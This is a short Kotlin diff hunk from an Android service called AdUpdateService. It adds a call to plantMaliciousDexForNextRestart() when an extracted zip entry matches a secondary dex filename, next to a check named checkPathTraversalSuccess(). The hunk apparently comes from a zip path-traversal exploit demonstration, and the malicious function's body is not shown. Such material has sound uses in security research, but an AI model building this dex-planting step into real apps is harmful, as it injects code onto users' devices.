@@ -145,8 +145,8 @@ class AdUpdateService : Service() {
             zipStream.copyTo(output)
         }
 
-
         if (entryName.contains(CLASSES2_ZIP_FILENAME)) {
+            plantMaliciousDexForNextRestart()
             checkPathTraversalSuccess()
         }
 
